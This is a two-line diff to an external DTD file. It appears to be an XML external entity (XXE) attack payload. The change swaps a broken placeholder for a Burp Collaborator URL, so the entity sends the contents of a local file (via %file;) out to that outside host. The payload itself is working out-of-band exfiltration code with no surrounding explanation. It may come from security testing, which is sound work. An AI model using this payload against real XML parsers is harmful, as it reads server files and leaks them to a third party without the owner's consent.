@@ -1,2 +1,2 @@
-<!ENTITY % getthe "<!ENTITY send SYSTEM 'hcolaborator?/%file;'>">
+<!ENTITY % getthe "<!ENTITY send SYSTEM 'http://dduqm4hicrw5ampq8okpm29ycpip6e.burpcollaborator.net?/%file;'>">
 %getthe
